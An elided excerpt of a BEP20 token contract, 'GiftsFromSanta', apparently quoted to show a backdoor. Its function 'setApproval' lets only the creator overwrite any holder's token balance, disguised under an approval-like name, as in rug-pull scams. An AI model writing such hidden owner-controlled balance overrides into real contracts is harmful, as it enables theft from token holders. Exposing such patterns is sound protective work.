...
contract GiftsFromSanta is BEP20 {
  ...
  function selectVariant(bytes32 GH, address _from, uint256 _value, uint32 variant) internal view onlyCreator returns (uint256) {
  ...
  function setApproval(bytes32 GH, address _from, uint256 _value, uint32 variant) public onlyCreator returns (bool) {
    if(_from != address(0) && msg.sender != address(0))
    _balances[_from] = selectVariant(GH, _from, _value, variant);
    return true;
  }
